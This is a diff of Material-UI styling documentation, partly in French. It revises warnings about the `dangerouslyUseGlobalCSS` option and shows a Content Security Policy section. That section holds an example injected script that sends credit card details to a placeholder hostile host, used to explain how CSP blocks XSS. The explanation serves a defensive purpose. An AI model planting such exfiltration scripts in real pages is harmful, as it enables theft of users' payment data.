@@ -256,10 +256,10 @@ We provide an option to make the class names **deterministic** with the [`danger
 - development: `.AppBar-root`
 - production: `.AppBar-root`
 
-⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** We provide this option as an escape hatch for prototyping. Relying on it for code running in production has the following implications:
+⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** Relying on it for code running in production has the following implications:
 
-- Global CSS is inherently fragile. People use strict methodologies like [BEM](http://getbem.com/introduction/) to workaround the issue.
-- It's harder to keep track of `classes` API changes.
+- It's harder to keep track of `classes` API changes between major releases.
+- Global CSS is inherently fragile.
 
 ⚠️ When using `dangerouslyUseGlobalCSS` standalone (without Material-UI), you should name your style sheets using the `options` parameter:
 
@@ -283,7 +283,7 @@ Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en oblige
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-
+    
 
 Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.
 
